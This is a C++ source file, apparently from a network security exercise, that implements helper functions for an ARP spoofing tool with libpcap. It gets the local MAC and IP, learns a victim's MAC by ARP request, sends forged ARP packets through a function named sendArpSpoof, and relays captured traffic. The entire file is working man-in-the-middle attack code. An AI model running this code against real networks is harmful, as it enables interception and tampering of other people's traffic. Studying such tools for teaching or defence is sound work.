#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include <net/if.h>
#include "arphdr.h"
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include "getPacket.h"
#define MAC_SIZE 6



int getMyMac(const char* dev, EthArpPacket &packet) {
    struct ifreq ifr;
    int sockfd, ret;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("Fail to get interface MAC address - socket() failed - %m\n");
        return -1;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0) {
        printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sockfd);
        return -1;
    }

    close(sockfd);
    memcpy(&packet.eth_.smac_, ifr.ifr_hwaddr.sa_data, MAC_SIZE);
    memcpy(&packet.arp_.smac_, ifr.ifr_hwaddr.sa_data, MAC_SIZE);
    return 0;
}
int getMyIp(const char* dev, EthArpPacket &packet) {
    int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("Fail to get interface IP address - socket() failed - %m\n");
        return -1;
    }

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        printf("Fail to get interface IP address - ioctl(SIOCSIFADDR) failed - %m\n");
        close(sockfd);
        return -1;
    }

    close(sockfd);

    packet.arp_.sip_ = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;

    return 0;
}
bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* responsePacket;
        int res = pcap_next_ex(handle, &header, &responsePacket);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return false;
        }
        
        // detection for eth-arp packet(sender'sip)
        EthArpPacket* recvPacket = (EthArpPacket*)responsePacket;
        if (ntohs(recvPacket->eth_.type_) != EthHdr::Arp) {
            continue;
        }
        if(ntohs(recvPacket->arp_.op_) != ArpHdr::Reply) {
            continue;
        }
        if(recvPacket->arp_.sip_ != packet.arp_.tip_) {
            continue;
        }

        memcpy(&packet.arp_.tmac_, &recvPacket->arp_.smac_, MAC_SIZE); 
        memcpy(&packet.eth_.dmac_, &recvPacket->eth_.smac_, MAC_SIZE);
        return true;
    }
}

bool sendArpSpoof(pcap_t* handle, EthArpPacket &packet) {

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return false;
    }
    return true;
}

void relay_packet(pcap_t* handle) {
    struct pcap_pkthdr header;  // header pcap gives us
    const u_char *packet;       // actual packet

    // loop for packet capturing
    while (1) {
        packet = pcap_next(handle, &header);
        if (packet == NULL)  /* end of file */
            break;

        // simply send the packet back out
        if (pcap_sendpacket(handle, packet, header.len) != 0) {
            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
            return;
        }
    }
}